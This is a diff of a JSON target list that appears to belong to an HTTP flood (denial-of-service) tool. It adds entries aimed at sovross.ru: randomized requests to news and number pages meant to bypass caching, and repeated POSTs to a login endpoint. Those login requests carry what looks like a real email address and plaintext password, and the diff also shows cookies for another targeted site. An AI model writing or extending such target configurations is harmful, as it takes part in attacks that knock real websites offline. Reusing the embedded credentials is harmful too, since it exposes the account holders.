@@ -35,10 +35,29 @@
       }
     },
     {
-      "target": "https://therussophile.org",
+      "target": "https://sovross.ru",
       "method": "HTTP_TEMPLATE",
       "options": {
-        "path_qs": "/page/{{int(1,100)}}/?s={{str(1)}}&tf-scroll=1"
+        "headers": "{\"Referer\": \"https://sovross.ru/\"}",
+        "path_qs": "/numbers/{{int(1,2322)}}"
+      }
+    },
+    {
+      "target": "https://sovross.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://sovross.ru/\"}",
+        "path_qs": "/news/{{int(1,58137)}}"
+      }
+    },
+    {
+      "target": "https://sovross.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "body": "action=cabinet_v2&user_action=log_in&log=vag@sovross.ru&pass=f9aLksg8adS&remm=undefined",
+        "headers": "{\"Content-Type\": \"application/x-www-form-urlencoded\", \"Referer\": \"https://sovross.ru/\", \"X-Requested-With\": \"XMLHttpRequest\"}",
+        "path_qs": "/ajax/index.php",
+        "verb": "POST"
       }
     },
     {
@@ -47,6 +66,13 @@
       "options": {
         "headers": "{\"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"Cookie\": \"beget=begetok; thwcfe_session_id=thwcfe_926b3ee9ce57e51f6e3a5e6839e6b270; xlutm_params_first_occurrence=%7B%22timestamp%22%3A1669620038%7D\", \"Referer\": \"https://swiss-krono.ru/\", \"X-Requested-With\": \"XMLHttpRequest\"}",
         "path_qs": "/shop/page/{{int(1,10)}}/?s={{str(1)}}&post_type=product&per_page=24&_pjax=.main-page-wrapper"
+      }
+    },
+    {
+      "target": "https://therussophile.org",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "path_qs": "/page/{{int(1,100)}}/?s={{str(1)}}&tf-scroll=1"
       }
     }
   ]
